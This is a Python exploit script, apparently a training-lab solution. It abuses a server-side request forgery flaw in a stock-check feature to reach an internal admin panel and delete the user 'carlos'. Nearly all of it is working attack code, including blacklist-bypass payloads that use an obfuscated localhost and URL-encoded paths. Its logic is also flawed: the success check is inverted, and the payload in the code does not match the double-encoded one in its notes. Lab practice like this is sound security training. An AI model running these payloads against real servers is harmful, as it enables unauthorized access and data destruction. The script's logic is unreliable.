# SSRF (Server Side Request Forgery)
'''
Vulnerable feature - stock check functionality

Goal - change the stock check URL to access the admin interface at http://localhost/admin and delete the usesr Carlos

Analysis:

localhost: http://127.1/
admin interface: http://127.1/%25%36%31dmin
delete Carlos: http://127.1/%25%36%31dmin/delete?username=carlos

- URL decoding one time
- regex search using a blacklist of strings 
'''

import requests 
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Disable insexure request warning

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # Sending proxies to Burp

def delete_user(url):
    delete_user_url_ssrf_payload = 'http://127.1/%61dmin/delete?username=carlos'
    check_stock_path = '/product/stock' # Check page that is vulnerable
    params = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)

    # Check if user was deleted
    params2 = {'stockApi': 'http://127.1/%61dmin/'}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
    if 'User deleted suxxessfully' in r.text: # Print message if was successfully
        print("(-) Exploit was unsuccessful.")
    else:
        print("(+) Successfully deleted Carlos user")

def main():
    if len(sys.argv) !=2: # if the length of the parametr that you give to the script is not equal to 2
        print("(+) Usage: %s <url>" % sys.argv[0]) # Print a message usage instruction, print the name of the script and that it takes parametr URL 
        print("(+) Example: %s www.example.com" % sys.argv[0]) # Put there example and take the name of the script
        sys.exit(-1)
    
    url = sys.argv[1] # Take a parametr that the user gave us
    print("(+) Deleting Carlos user...") # Show message that deleting user is in progress
    delete_user(url) # Delete user by this url and this admin ip address

if __name__ == "__main__": # Find name method
    main()
